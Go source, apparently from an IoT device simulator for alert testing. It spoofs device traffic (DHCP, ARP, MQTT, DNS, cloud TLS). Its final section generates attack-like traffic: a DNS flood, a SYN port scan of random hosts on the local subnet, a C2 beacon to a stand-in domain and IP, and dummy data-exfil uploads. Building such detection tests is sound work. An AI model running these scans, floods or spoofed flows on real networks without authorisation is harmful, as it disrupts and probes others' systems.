func (d *iotDeviceRunner) log(level, msg string) {
	if iotJSONOutput {
		emitIoTJSON("log", map[string]any{
			"device_id": d.spec.ID,
			"level":     level,
			"message":   msg,
		})
	} else {
		fmt.Printf("[%s] [%s] %s: %s\n", time.Now().Format("15:04:05"), strings.ToUpper(level), d.spec.ID, msg)
	}
}

func (d *iotDeviceRunner) emitStats() {
	if !iotJSONOutput {
		return
	}
	d.mu.RLock()
	uptime := d.previousUptime
	if !d.startTime.IsZero() {
		uptime += int64(time.Since(d.startTime).Seconds())
	}
	protosCopy := make(map[string]int64, len(d.protoCounts))
	for k, v := range d.protoCounts {
		protosCopy[k] = v
	}
	statsObj := map[string]any{
		"packets_sent":        d.packetsSent,
		"bytes_sent":          d.bytesSent,
		"current_ip":          d.currentIP,
		"uptime_seconds":      uptime,
		"protocols":           protosCopy,
		"bad_behavior_active": d.badBehaviorActive,
	}
	d.mu.RUnlock()

	emitIoTJSON("stats", map[string]any{
		"device_id": d.spec.ID,
		"stats":     statsObj,
	})
}

func (d *iotDeviceRunner) sendFrame(frame []byte, protocol string) {
	if err := d.rawEng.SendFrame(frame); err != nil {
		d.log("error", fmt.Sprintf("Send frame error (%s): %v", protocol, err))
		return
	}
	d.mu.Lock()
	d.packetsSent++
	d.bytesSent += int64(len(frame))
	if protocol != "" {
		d.protoCounts[protocol]++
	}
	d.mu.Unlock()
	totalIoTPackets.Add(1)
	totalIoTBytes.Add(int64(len(frame)))
}

func (d *iotDeviceRunner) getIPAndGateway() (string, string) {
	d.mu.RLock()
	defer d.mu.RUnlock()
	return d.currentIP, d.gatewayIP
}

func (d *iotDeviceRunner) setIPAndGateway(ip, gw string) {
	d.mu.Lock()
	oldIP := d.currentIP
	d.currentIP = ip
	if gw != "" {
		d.gatewayIP = gw
	}
	d.mu.Unlock()

	if oldIP != "" && oldIP != ip {
		d.rawEng.UnregisterDeviceIP(oldIP)
	}
	if ip != "" && ip != "0.0.0.0" {
		d.rawEng.RegisterDeviceIP(ip, d.macBytes, d.persona.OpenPorts)
		if ip != oldIP {
			d.emitStats()
		}
	}
}

func (d *iotDeviceRunner) start() {
	if d.spec.Enabled != nil && !*d.spec.Enabled {
		d.log("warning", "Device is disabled, skipping")
		return
	}
	select {
	case <-d.ctx.Done():
		return
	default:
	}

	d.mu.Lock()
	d.running = true
	d.startTime = time.Now()
	d.mu.Unlock()
	activeIoTDevices.Add(1)

	d.log("info", fmt.Sprintf("📡 [IOT-GO] System Interface: %s (Native AF_PACKET)", d.rawEng.ifaceName))
	d.log("info", fmt.Sprintf("🚀 Starting device simulation: %s (%s) [DHCP: %s]", d.spec.Name, d.spec.ID, d.dhcpMode))
	d.log("info", fmt.Sprintf("🆔 MAC addr: %s | Persona: %s (%s · FW %s)", d.spec.MAC, d.persona.Model, d.persona.OS, d.persona.Firmware))
	if d.spec.IPStart != "" {
		d.log("info", fmt.Sprintf("📌 Fallback/Static IP: %s", d.spec.IPStart))
	}

	emitIoTJSON("started", map[string]any{"device_id": d.spec.ID})

	// Periodic stats reporter every 5s
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-d.ctx.Done():
				return
			case <-ticker.C:
				d.emitStats()
			}
		}
	}()

	// Sequenced boot: DHCP first, then protocol workers & bad behavior
	go d.bootSequence()
}

func (d *iotDeviceRunner) stop() {
	d.mu.Lock()
	wasRunning := d.running
	d.running = false
	ip := d.currentIP
	if d.badBehaviorCancel != nil {
		d.badBehaviorCancel()
		d.badBehaviorCancel = nil
	}
	d.badBehaviorActive = false
	d.mu.Unlock()

	d.cancel()
	if ip != "" {
		d.rawEng.UnregisterDeviceIP(ip)
	}
	if wasRunning {
		activeIoTDevices.Add(-1)
		d.log("info", "⏹️ Simulation stopped")
		d.emitStats()
		emitIoTJSON("stopped", map[string]any{"device_id": d.spec.ID})
	}
}

func (d *iotDeviceRunner) hasProtocol(proto string) bool {
	for _, p := range d.spec.Protocols {
		if strings.EqualFold(p, proto) {
			return true
		}
	}
	return false
}

func (d *iotDeviceRunner) bootSequence() {
	if d.hasProtocol("dhcp") {
		d.doDHCPSequence()
	}

	select {
	case <-d.ctx.Done():
		return
	default:
	}

	ip, gw := d.getIPAndGateway()
	if ip == "" || ip == "0.0.0.0" {
		d.log("error", "❌ No IP obtained after DHCP — protocol goroutines and bad behavior will NOT start")
		return
	}
	d.setIPAndGateway(ip, gw)
	d.log("info", fmt.Sprintf("✅ IP ready: %s — starting protocol goroutines", ip))

	for _, proto := range d.spec.Protocols {
		p := strings.ToLower(proto)
		if p == "dhcp" {
			continue
		}
		if p == "snmp" {
			d.log("warning", "⚠️ SNMP deprecated — skipped")
			continue
		}
		go d.runProtocolWorker(p)
	}

	if d.hasProtocol("dhcp") {
		go d.dhcpRenewalLoop()
	}

	if iotBadBehaviorGlob.Load() && d.spec.Security.BadBehavior {
		// Allow 5s of clean baseline protocol traffic (ARP, LLDP, DNS, HTTP/Cloud) after DHCP ACK
		// before starting bad behavior so the device IP and normal identity are established first.
		if !d.sleepOrDone(5 * time.Second) {
			return
		}
		d.enableBadBehavior()
	}
}

func (d *iotDeviceRunner) enableBadBehavior() {
	if !d.spec.Security.BadBehavior {
		return
	}
	d.mu.Lock()
	if d.badBehaviorActive || !d.running {
		d.mu.Unlock()
		return
	}
	ip := d.currentIP
	if ip == "" || ip == "0.0.0.0" {
		d.mu.Unlock()
		return
	}
	bCtx, bCancel := context.WithCancel(d.ctx)
	d.badBehaviorCancel = bCancel
	d.badBehaviorActive = true
	d.mu.Unlock()

	bTypes := d.spec.Security.ParsedBehaviorTypes()
	d.log("warning", fmt.Sprintf("⚠️ BAD BEHAVIOR ENABLED (types: %s) — IP: %s", strings.Join(bTypes, ", "), ip))
	emitIoTJSON("bad_behavior_enabled", map[string]any{
		"device_id":      d.spec.ID,
		"behavior_types": bTypes,
	})
	go d.runBadBehaviorDispatcher(bCtx, bTypes)
}

func (d *iotDeviceRunner) disableBadBehavior() {
	d.mu.Lock()
	if d.badBehaviorCancel != nil {
		d.badBehaviorCancel()
		d.badBehaviorCancel = nil
	}
	d.badBehaviorActive = false
	d.mu.Unlock()
}

// ── DHCP Implementation (RFC 2131 INIT-REBOOT + DISCOVER/OFFER/REQUEST/ACK) ──

func detectHostDefaultGateway() string {
	out, err := exec.Command("ip", "route", "show", "default").Output()
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(out), "\n") {
		parts := strings.Fields(line)
		for i := 0; i+1 < len(parts); i++ {
			if parts[i] == "via" {
				return parts[i+1]
			}
		}
	}
	return ""
}

func (d *iotDeviceRunner) dhcpFingerprintParams() (hostname, vendorClass string, clientIDType uint8, paramReqList []uint8) {
	fp := d.spec.Fingerprint.DHCP
	hostname = fp.Hostname
	if hostname == "" {
		if d.spec.Name != "" {
			hostname = d.spec.Name
		} else if d.spec.ID != "" {
			hostname = d.spec.ID
		} else {
			hostname = "iot-device"
		}
	}
	vendorClass = fp.VendorClassID
	if vendorClass == "" {
		vc := strings.TrimSpace(fmt.Sprintf("%s %s", d.spec.Vendor, d.spec.Type))
		if vc == "" {
			vc = "Generic IoT Device"
		}
		vendorClass = vc
	}
	clientIDType = 1
	if fp.ClientIDType != nil {
		clientIDType = uint8(*fp.ClientIDType)
	}
	if len(fp.ParamReqList) > 0 {
		for _, v := range fp.ParamReqList {
			if v >= 0 && v <= 255 {
				paramReqList = append(paramReqList, uint8(v))
			}
		}
	} else {
		paramReqList = []uint8{1, 3, 6, 15, 28, 51, 54}
	}
	return
}

func (d *iotDeviceRunner) sendGratuitousARP(ipStr string) {
	ip4, err := parseIPv4(ipStr)
	if err != nil {
		return
	}
	garp := buildARPFrame(2, d.macBytes, ip4, broadcastMAC, ip4, true)
	d.sendFrame(garp, "arp")
	d.log("info", fmt.Sprintf("📣 Gratuitous ARP: %s is-at %s", ipStr, d.spec.MAC))
}

func (d *iotDeviceRunner) doDHCPSequence() {
	const maxRetries = 3
	const dhcpTimeout = 4 * time.Second

	// Phase 0: RFC 2131 INIT-REBOOT if we have a persisted lease
	savedLease, hasSaved := getDHCPLease(d.spec.MAC)
	if hasSaved && savedLease.IP != "" {
		d.log("info", fmt.Sprintf("📋 Saved DHCP lease found: %s — attempting INIT-REBOOT (RFC 2131)", savedLease.IP))
		if d.dhcpInitRebootAttempt(savedLease.IP, dhcpTimeout) == "ack_ok" {
			return
		}
		d.log("info", "🔄 INIT-REBOOT rejected or timed out — falling back to full DISCOVER")
	}

	var lastOfferedIP string
	for attempt := 1; attempt <= maxRetries; attempt++ {
		select {
		case <-d.ctx.Done():
			return
		default:
		}
		res, offeredIP := d.dhcpAttempt(attempt, dhcpTimeout)
		if res == "ack_ok" {
			return
		}
		if res == "offer_no_ack" && offeredIP != "" {
			lastOfferedIP = offeredIP
		}
		if attempt < maxRetries {
			wait := time.Duration(2*attempt) * time.Second
			d.log("warning", fmt.Sprintf("⏳ DHCP retry %d/%d in %v...", attempt, maxRetries, wait))
			select {
			case <-d.ctx.Done():
				return
			case <-time.After(wait):
			}
		}
	}

	// Fallback 1: use last OFFER if ACK was missed
	if lastOfferedIP != "" {
		gw := detectHostDefaultGateway()
		d.setIPAndGateway(lastOfferedIP, gw)
		d.log("warning", fmt.Sprintf("⚠️ DHCP ACK never confirmed — using offered IP %s (gateway: %s)", lastOfferedIP, gw))
		d.sendGratuitousARP(lastOfferedIP)
		return
	}

	// Fallback 2: reuse cached lease from disk
	if hasSaved && savedLease.IP != "" {
		gw := savedLease.Gateway
		if gw == "" {
			gw = detectHostDefaultGateway()
		}
		d.setIPAndGateway(savedLease.IP, gw)
		d.log("warning", fmt.Sprintf("⚠️ DHCP unreachable — reusing cached lease: %s (gateway: %s)", savedLease.IP, gw))
		d.sendGratuitousARP(savedLease.IP)
		return
	}

	// Fallback 3: if static IP was configured on device, use it with host gateway
	if d.spec.IPStart != "" {
		gw := d.spec.Gateway
		if gw == "" {
			gw = detectHostDefaultGateway()
		}
		d.setIPAndGateway(d.spec.IPStart, gw)
		d.log("warning", fmt.Sprintf("⚠️ DHCP unreachable — falling back to configured static IP: %s", d.spec.IPStart))
		d.sendGratuitousARP(d.spec.IPStart)
		return
	}

	d.setIPAndGateway("", "")
	d.log("error", "❌ DHCP failed after 3 attempts — no OFFER received and no saved lease.")
}

func (d *iotDeviceRunner) dhcpInitRebootAttempt(savedIP string, timeout time.Duration) string {
	xid := rand.Uint32()
	if xid == 0 {
		xid = 1
	}
	hostname, vendorClass, clientIDType, paramReqList := d.dhcpFingerprintParams()
	reqFrame := buildDHCPFrame(3, xid, d.macBytes, hostname, vendorClass, clientIDType, paramReqList, savedIP, "")

	d.log("info", fmt.Sprintf("📤 DHCP INIT-REBOOT REQUEST for %s (xid: 0x%x)", savedIP, xid))
	d.sendFrame(reqFrame, "dhcp")

	reply := d.rawEng.WaitDHCP(d.ctx, xid, []uint8{5, 6}, timeout)
	if reply == nil {
		d.log("warning", fmt.Sprintf("⚠️ No server response to INIT-REBOOT (timeout %v)", timeout))
		return "no_response"
	}
	if reply.MsgType == 6 {
		d.log("warning", fmt.Sprintf("⚠️ DHCP NAK for saved IP %s", savedIP))
		return "nak"
	}
	if reply.MsgType == 5 {
		assignedIP := reply.YourIP
		gw := reply.RouterIP
		if gw == "" {
			_, gw = d.getIPAndGateway()
		}
		d.setIPAndGateway(assignedIP, gw)
		if gw != "" {
			d.log("info", fmt.Sprintf("🌐 Gateway from DHCP: %s", gw))
		}
		d.log("info", fmt.Sprintf("✅ INIT-REBOOT success — same IP confirmed: %s", assignedIP))
		emitIoTJSON("dhcp_ack", map[string]any{
			"device_id":   d.spec.ID,
			"assigned_ip": assignedIP,
			"server_id":   reply.ServerIP,
			"gateway":     gw,
			"init_reboot": true,
		})
		d.sendGratuitousARP(assignedIP)
		saveDHCPLease(d.spec.MAC, assignedIP, gw)
		return "ack_ok"
	}
	return "no_response"
}

func (d *iotDeviceRunner) dhcpAttempt(attempt int, timeout time.Duration) (string, string) {
	d.log("info", fmt.Sprintf("🔄 DHCP attempt %d (mode: %s)...", attempt, d.dhcpMode))
	xid := rand.Uint32()
	if xid == 0 {
		xid = 1
	}
	hostname, vendorClass, clientIDType, paramReqList := d.dhcpFingerprintParams()
	d.log("info", fmt.Sprintf("🔐 Using DHCP fingerprint: hostname='%s', vendor_class='%s', param_req_list=%v", hostname, vendorClass, paramReqList))

	discoverFrame := buildDHCPFrame(1, xid, d.macBytes, hostname, vendorClass, clientIDType, paramReqList, "", "")
	d.log("info", fmt.Sprintf("📤 DHCP DISCOVER (xid: 0x%x, MAC: %s)", xid, d.spec.MAC))
	emitIoTJSON("dhcp_discover", map[string]any{
		"device_id": d.spec.ID,
		"xid":       fmt.Sprintf("0x%x", xid),
		"mac":       d.spec.MAC,
		"attempt":   attempt,
	})
	d.sendFrame(discoverFrame, "dhcp")

	d.log("info", fmt.Sprintf("⏳ Waiting for DHCP OFFER (timeout: %v)...", timeout))
	offer := d.rawEng.WaitDHCP(d.ctx, xid, []uint8{2}, timeout)
	if offer == nil {
		d.log("warning", fmt.Sprintf("⚠️ No DHCP OFFER received (timeout %v)", timeout))
		return "no_offer", ""
	}

	offeredIP := offer.YourIP
	serverIP := offer.ServerIP
	d.log("info", fmt.Sprintf("✅ DHCP OFFER from %s (offered: %s)", serverIP, offeredIP))
	emitIoTJSON("dhcp_offer", map[string]any{
		"device_id":  d.spec.ID,
		"server_id":  serverIP,
		"offered_ip": offeredIP,
	})

	select {
	case <-d.ctx.Done():
		return "error", ""
	case <-time.After(250 * time.Millisecond):
	}

	reqIP := offeredIP
	if d.dhcpMode == "static" && d.spec.IPStart != "" {
		reqIP = d.spec.IPStart
	}
	d.log("info", fmt.Sprintf("📤 DHCP REQUEST for IP %s", reqIP))
	reqFrame := buildDHCPFrame(3, xid, d.macBytes, hostname, vendorClass, clientIDType, paramReqList, reqIP, serverIP)
	d.sendFrame(reqFrame, "dhcp")

	d.log("info", fmt.Sprintf("⏳ Waiting for DHCP ACK (timeout: %v)...", timeout))
	ack := d.rawEng.WaitDHCP(d.ctx, xid, []uint8{5, 6}, timeout)
	if ack == nil {
		d.log("warning", fmt.Sprintf("⚠️ No DHCP ACK received (timeout %v) — offer was %s", timeout, offeredIP))
		return "offer_no_ack", offeredIP
	}
	if ack.MsgType == 6 {
		d.log("error", "❌ DHCP NAK received")
		return "error", ""
	}
	if ack.MsgType == 5 {
		assignedIP := ack.YourIP
		gw := ack.RouterIP
		if gw == "" && offer.RouterIP != "" {
			gw = offer.RouterIP
		}
		if gw == "" {
			gw = detectHostDefaultGateway()
		}
		d.setIPAndGateway(assignedIP, gw)
		if gw != "" {
			d.log("info", fmt.Sprintf("🌐 Gateway from DHCP: %s", gw))
		}
		d.log("info", fmt.Sprintf("✅ DHCP ACK: %s from %s", assignedIP, ack.ServerIP))
		emitIoTJSON("dhcp_ack", map[string]any{
			"device_id":   d.spec.ID,
			"assigned_ip": assignedIP,
			"server_id":   ack.ServerIP,
			"gateway":     gw,
		})
		time.Sleep(100 * time.Millisecond)
		d.sendGratuitousARP(assignedIP)
		saveDHCPLease(d.spec.MAC, assignedIP, gw)
		d.log("info", fmt.Sprintf("✅ DHCP complete (IP: %s, GW: %s)", assignedIP, gw))
		return "ack_ok", assignedIP
	}
	return "offer_no_ack", offeredIP
}

func (d *iotDeviceRunner) dhcpRenewalLoop() {
	interval := time.Duration(d.spec.TrafficInterval*5) * time.Second
	if interval < 60*time.Second {
		interval = 60 * time.Second
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-d.ctx.Done():
			return
		case <-ticker.C:
			d.doDHCPSequence()
		}
	}
}

// ── Normal Protocol Workers ──────────────────────────────────────────────────

func (d *iotDeviceRunner) httpUserAgent() string {
	if d.persona.UserAgent != "" {
		return d.persona.UserAgent
	}
	_, vendorClass, _, _ := d.dhcpFingerprintParams()
	vc := strings.TrimSpace(vendorClass)
	if vc == "" {
		vc = "Embedded-IoT"
	}
	vendor := strings.TrimSpace(d.spec.Vendor)
	if vendor == "" {
		vendor = "Generic"
	}
	devType := strings.TrimSpace(d.spec.Type)
	if devType == "" {
		devType = "IoT"
	}
	return fmt.Sprintf("%s/2.4 (%s; %s; ID/%s)", strings.ReplaceAll(vc, " ", "-"), vendor, devType, d.spec.ID)
}

func (d *iotDeviceRunner) sendSpoofedTCP(dstIPStr string, dstPort uint16, flags uint8, payload []byte, protoLabel string) bool {
	ipStr, gwStr := d.getIPAndGateway()
	srcIP, err1 := parseIPv4(ipStr)
	dstIP, err2 := parseIPv4(dstIPStr)
	if err1 != nil || err2 != nil {
		return false
	}
	dstMAC := d.rawEng.ResolveDstMAC(dstIPStr, gwStr)
	sport := uint16(1024 + rand.Intn(64000))
	frame := buildIPv4TCPFrame(dstMAC, d.macBytes, srcIP, dstIP, sport, dstPort, flags, payload)
	d.sendFrame(frame, protoLabel)
	return true
}

// sendSpoofedTCPFlow initiates a TCP 3-way handshake (SYN) and registers the L7 payload
// so iotRawEngine replies with ACK + PSH|ACK (L7 payload) + FIN|ACK upon receiving SYN-ACK.
func (d *iotDeviceRunner) sendSpoofedTCPFlow(dstIPStr string, dstPort uint16, l7Payload []byte, protoLabel string) bool {
	ipStr, gwStr := d.getIPAndGateway()
	srcIP, err1 := parseIPv4(ipStr)
	dstIP, err2 := parseIPv4(dstIPStr)
	if err1 != nil || err2 != nil {
		return false
	}
	dstMAC := d.rawEng.ResolveDstMAC(dstIPStr, gwStr)
	sport := uint16(32768 + rand.Intn(28231))
	clientISN := rand.Uint32()
	if len(l7Payload) > 0 {
		d.rawEng.RegisterPendingTCP(
			ipStr, dstIPStr,
			d.macBytes, dstMAC,
			srcIP, dstIP,
			sport, dstPort,
			clientISN,
			l7Payload,
			func(f []byte) { d.sendFrame(f, protoLabel) },
		)
	}
	synFrame := buildIPv4TCPFrameWithSeq(dstMAC, d.macBytes, srcIP, dstIP, sport, dstPort, clientISN, 0, tcpFlagSYN, nil)
	d.sendFrame(synFrame, protoLabel)
	return true
}

func (d *iotDeviceRunner) sendSpoofedUDP(dstIPStr string, srcPort, dstPort uint16, payload []byte, protoLabel string) bool {
	ipStr, gwStr := d.getIPAndGateway()
	srcIP, err1 := parseIPv4(ipStr)
	dstIP, err2 := parseIPv4(dstIPStr)
	if err1 != nil || err2 != nil {
		return false
	}
	dstMAC := d.rawEng.ResolveDstMAC(dstIPStr, gwStr)
	frame := buildIPv4UDPFrame(dstMAC, d.macBytes, srcIP, dstIP, srcPort, dstPort, payload)
	d.sendFrame(frame, protoLabel)
	return true
}

func (d *iotDeviceRunner) sleepOrDone(dur time.Duration) bool {
	select {
	case <-d.ctx.Done():
		return false
	case <-time.After(dur):
		return true
	}
}

func (d *iotDeviceRunner) runProtocolWorker(proto string) {
	interval := time.Duration(d.spec.TrafficInterval) * time.Second
	if interval < 5*time.Second {
		interval = 5 * time.Second
	}

	switch proto {
	case "lldp":
		d.log("info", "📡 LLDP goroutine started")
		sysDesc := d.persona.LLDPSystemDesc
		if sysDesc == "" {
			sysDesc = strings.TrimSpace(fmt.Sprintf("%s %s", d.spec.Vendor, d.spec.Type))
		}
		for {
			frame := buildLLDPFrame(d.macBytes, d.spec.MAC, d.spec.Name, sysDesc)
			d.sendFrame(frame, "lldp")
			d.log("info", "📡 LLDP advertisement sent to switch")
			if !d.sleepOrDone(30 * time.Second) {
				return
			}
		}

	case "arp":
		d.log("debug", "🔍 ARP goroutine started")
		for {
			ipStr, gwStr := d.getIPAndGateway()
			if ipStr != "" && gwStr != "" {
				srcIP, err1 := parseIPv4(ipStr)
				gwIP, err2 := parseIPv4(gwStr)
				if err1 == nil && err2 == nil {
					frame := buildARPFrame(1, d.macBytes, srcIP, zeroMAC, gwIP, false)
					d.sendFrame(frame, "arp")
					d.log("debug", fmt.Sprintf("📤 ARP request sent for gateway %s", gwStr))
				}
			}
			if !d.sleepOrDone(interval) {
				return
			}
		}

	case "http":
		d.log("debug", "🌐 HTTP goroutine started")
		ua := d.httpUserAgent()
		for {
			_, gwStr := d.getIPAndGateway()
			if gwStr != "" {
				l7 := buildHTTPGetPayload(gwStr, "/api/v1/status", ua)
				if d.sendSpoofedTCPFlow(gwStr, 80, l7, "http") {
					d.log("debug", fmt.Sprintf("📤 HTTP GET /api/v1/status sent to %s:80", gwStr))
				}
			}
			if !d.sleepOrDone(interval) {
				return
			}
		}

	case "mqtt":
		d.log("debug", "💬 MQTT goroutine started")
		hostname, _, _, _ := d.dhcpFingerprintParams()
		l7 := buildMQTTConnectPayload(hostname)
		for {
			_, gwStr := d.getIPAndGateway()
			mqttBroker := "192.168.207.150"
			if cloudCfg, ok := iotCloudDestinations[d.spec.Vendor]; ok && len(cloudCfg.Servers) > 0 {
				mqttBroker = cloudCfg.Servers[0]
			} else if gwStr != "" {
				mqttBroker = gwStr
			}
			if d.sendSpoofedTCPFlow(mqttBroker, 1883, l7, "mqtt") {
				d.log("debug", fmt.Sprintf("📤 MQTT CONNECT (%s) sent to %s:1883", hostname, mqttBroker))
			}
			if !d.sleepOrDone(interval) {
				return
			}
		}

	case "rtsp":
		d.log("debug", "🎥 RTSP goroutine started")
		ua := d.httpUserAgent()
		for {
			_, gwStr := d.getIPAndGateway()
			if gwStr != "" {
				l7 := buildRTSPOptionsPayload(gwStr, ua)
				if d.sendSpoofedTCPFlow(gwStr, 554, l7, "rtsp") {
					d.log("debug", fmt.Sprintf("📤 RTSP OPTIONS sent to %s:554", gwStr))
				}
			}
			if !d.sleepOrDone(interval) {
				return
			}
		}

	case "mdns":
		d.log("debug", "🔎 mDNS goroutine started")
		payload := buildDNSQueryPayload("_services._dns-sd._udp.local")
		for {
			if d.sendSpoofedUDP("224.0.0.251", 5353, 5353, payload, "mdns") {
				d.log("debug", "📤 mDNS query sent")
			}
			if !d.sleepOrDone(interval * 3) {
				return
			}
		}

	case "cloud":
		d.log("debug", "☁️ Cloud traffic goroutine started")
		cloudCfg, ok := iotCloudDestinations[d.spec.Vendor]
		if !ok || len(cloudCfg.Servers) == 0 {
			cloudCfg = iotVendorCloud{Servers: []string{"8.8.8.8"}, Domains: []string{"www.google.com"}}
		}
		sniDomain := "www.google.com"
		if len(cloudCfg.Domains) > 0 && cloudCfg.Domains[0] != "" {
			sniDomain = cloudCfg.Domains[0]
		}
		ua := d.httpUserAgent()
		tlsHello := buildTLSClientHelloPayload(sniDomain)
		httpBeat := buildHTTPGetPayload(sniDomain, "/v1/telemetry/heartbeat", ua)
		for {
			// Emit spoofed DNS query from the IoT device IP before initiating the TCP connection
			_, gw := d.getIPAndGateway()
			dnsSrv := iotPublicDNS[0]
			if gw != "" {
				dnsSrv = gw
			}
			sport := uint16(49152 + rand.Intn(16383))
			d.sendSpoofedUDP(dnsSrv, sport, 53, buildDNSQueryPayload(sniDomain), "dns")
			if !d.sleepOrDone(200 * time.Millisecond) {
				return
			}

			fallbackSrv := cloudCfg.Servers[0]
			targetSrv := resolveDomainIPv4(sniDomain, fallbackSrv)
			if d.sendSpoofedTCPFlow(targetSrv, 443, tlsHello, "cloud") {
				d.log("info", fmt.Sprintf("☁️ Cloud HTTPS (SNI: %s) sent to %s:443", sniDomain, targetSrv))
			}
			if !d.sleepOrDone(2 * time.Second) {
				return
			}
			if d.sendSpoofedTCPFlow(targetSrv, 80, httpBeat, "cloud") {
				d.log("info", fmt.Sprintf("☁️ Cloud HTTP GET (%s) sent to %s:80", sniDomain, targetSrv))
			}
			if !d.sleepOrDone(interval * 2) {
				return
			}
		}

	case "dns":
		d.log("debug", "🌐 DNS goroutine started")
		cloudCfg, ok := iotCloudDestinations[d.spec.Vendor]
		domains := cloudCfg.Domains
		if !ok || len(domains) == 0 {
			domains = []string{"www.google.com"}
		}
		for {
			for _, domain := range domains {
				for _, dnsSrv := range iotPublicDNS {
					q := buildDNSQueryPayload(domain)
					sport := uint16(49152 + rand.Intn(16383))
					if d.sendSpoofedUDP(dnsSrv, sport, 53, q, "dns") {
						d.log("info", fmt.Sprintf("🌐 DNS query sent: %s → %s", domain, dnsSrv))
					}
					if !d.sleepOrDone(1 * time.Second) {
						return
					}
				}
			}
			if !d.sleepOrDone(interval * 3) {
				return
			}
		}

	case "ntp":
		d.log("debug", "🕐 NTP goroutine started")
		payload := buildNTPPayload()
		for {
			for _, ntpSrv := range iotPublicNTP {
				if d.sendSpoofedUDP(ntpSrv, 123, 123, payload, "ntp") {
					d.log("info", fmt.Sprintf("🕐 NTP request sent to %s", ntpSrv))
				}
				if !d.sleepOrDone(2 * time.Second) {
					return
				}
			}
			if !d.sleepOrDone(interval * 5) {
				return
			}
		}
	}
}

// ── Bad Behavior Workers (Security / Alert Testing) ──────────────────────────

func (d *iotDeviceRunner) isBadBehaviorActive(bCtx context.Context) bool {
	select {
	case <-bCtx.Done():
		return false
	default:
	}
	if !iotBadBehaviorGlob.Load() {
		return false
	}
	d.mu.RLock()
	active := d.running && d.badBehaviorActive
	d.mu.RUnlock()
	return active
}

func (d *iotDeviceRunner) sleepBadBehavior(bCtx context.Context, dur time.Duration) bool {
	select {
	case <-bCtx.Done():
		return false
	case <-time.After(dur):
		return d.isBadBehaviorActive(bCtx)
	}
}

func (d *iotDeviceRunner) runBadBehaviorDispatcher(bCtx context.Context, bTypes []string) {
	d.log("warning", fmt.Sprintf("💀 BAD BEHAVIOR dispatcher started (types: %s)", strings.Join(bTypes, ", ")))
	for _, bt := range bTypes {
		bType := strings.TrimSpace(bt)
		switch bType {
		case "dns_flood":
			go d.badDNSFlood(bCtx)
		case "port_scan":
			go d.badPortScan(bCtx)
		case "beacon":
			go d.badBeacon(bCtx)
		case "data_exfil":
			go d.badDataExfil(bCtx)
		case "pan_test_domains":
			go d.badPANTestDomains(bCtx)
		case "random":
			go d.badRandomMix(bCtx)
		default:
			d.log("error", fmt.Sprintf("❌ Unknown behavior type: %s", bType))
		}
	}
}

func (d *iotDeviceRunner) badDNSFlood(bCtx context.Context) {
	d.log("warning", "💀 DNS FLOOD behavior started")
	for d.isBadBehaviorActive(bCtx) {
		_, gw := d.getIPAndGateway()
		servers := append([]string{}, iotPublicDNS...)
		if gw != "" {
			servers = append(servers, gw)
		}
		for i := 0; i < 3; i++ {
			if !d.isBadBehaviorActive(bCtx) {
				return
			}
			domain := iotSuspiciousDomains[rand.Intn(len(iotSuspiciousDomains))]
			srv := servers[rand.Intn(len(servers))]
			sport := uint16(50000 + rand.Intn(10000))
			if d.sendSpoofedUDP(srv, sport, 53, buildDNSQueryPayload(domain), "bad_dns") {
				d.log("warning", fmt.Sprintf("💀 [dns_flood] Query: %s → %s", domain, srv))
			}
			if !d.sleepBadBehavior(bCtx, 1*time.Second) {
				return
			}
		}
		if !d.sleepBadBehavior(bCtx, 60*time.Second) {
			return
		}
	}
}

func (d *iotDeviceRunner) badPortScan(bCtx context.Context) {
	d.log("warning", "💀 PORT SCAN behavior started")
	commonPorts := []uint16{21, 22, 23, 80, 443, 445, 3389, 8080, 8443, 10000}

	for d.isBadBehaviorActive(bCtx) {
		_, gw := d.getIPAndGateway()
		if gw == "" {
			if !d.sleepBadBehavior(bCtx, 10*time.Second) {
				return
			}
			continue
		}
		targets := []string{gw}
		parts := strings.Split(gw, ".")
		if len(parts) == 4 {
			prefix := strings.Join(parts[:3], ".")
			for i := 0; i < 5; i++ {
				targets = append(targets, fmt.Sprintf("%s.%d", prefix, 1+rand.Intn(253)))
			}
		}
		target := targets[rand.Intn(len(targets))]
		for _, port := range commonPorts {
			if !d.isBadBehaviorActive(bCtx) {
				return
			}
			if d.sendSpoofedTCP(target, port, tcpFlagSYN, nil, "bad_scan") {
				d.log("warning", fmt.Sprintf("💀 [port_scan] Scan: %s:%d", target, port))
			}
			if !d.sleepBadBehavior(bCtx, 500*time.Millisecond) {
				return
			}
		}
		if !d.sleepBadBehavior(bCtx, 120*time.Second) {
			return
		}
	}
}

func (d *iotDeviceRunner) badBeacon(bCtx context.Context) {
	d.log("warning", "💀 BEACON behavior started")
	const beaconDomain = "c2.malware-test.org"
	const beaconIP = "198.51.100.66"
	dnsSrv := iotPublicDNS[0]
	ua := d.httpUserAgent()
	l7Beacon := buildHTTPGetPayload(beaconDomain, "/gate.php?id="+d.spec.ID, ua)

	for d.isBadBehaviorActive(bCtx) {
		sport := uint16(49152 + rand.Intn(16383))
		if d.sendSpoofedUDP(dnsSrv, sport, 53, buildDNSQueryPayload(beaconDomain), "bad_beacon") {
			d.log("warning", fmt.Sprintf("💀 [beacon] DNS: %s", beaconDomain))
		}
		if !d.sleepBadBehavior(bCtx, 2*time.Second) {
			return
		}
		if d.sendSpoofedTCPFlow(beaconIP, 8443, l7Beacon, "bad_beacon") {
			d.log("warning", fmt.Sprintf("💀 [beacon] HTTP: %s:8443", beaconIP))
		}
		if !d.sleepBadBehavior(bCtx, 45*time.Second) {
			return
		}
	}
}

func (d *iotDeviceRunner) badDataExfil(bCtx context.Context) {
	d.log("warning", "💀 DATA EXFIL behavior started")
	targets := []struct {
		ip   string
		port uint16
	}{
		{"198.51.100.88", 443},
		{"203.0.113.50", 8080},
	}
	payload := bytesRepeat('X', 1400)

	for d.isBadBehaviorActive(bCtx) {
		t := targets[rand.Intn(len(targets))]
		for i := 0; i < 2; i++ {
			if !d.isBadBehaviorActive(bCtx) {
				return
			}
			if d.sendSpoofedTCP(t.ip, t.port, tcpFlagPA, payload, "bad_exfil") {
				d.log("warning", fmt.Sprintf("💀 [data_exfil] Upload: %s:%d (%d bytes)", t.ip, t.port, len(payload)))
			}
			if !d.sleepBadBehavior(bCtx, 1*time.Second) {
				return
			}
		}
		if !d.sleepBadBehavior(bCtx, 90*time.Second) {
			return
		}
	}
}

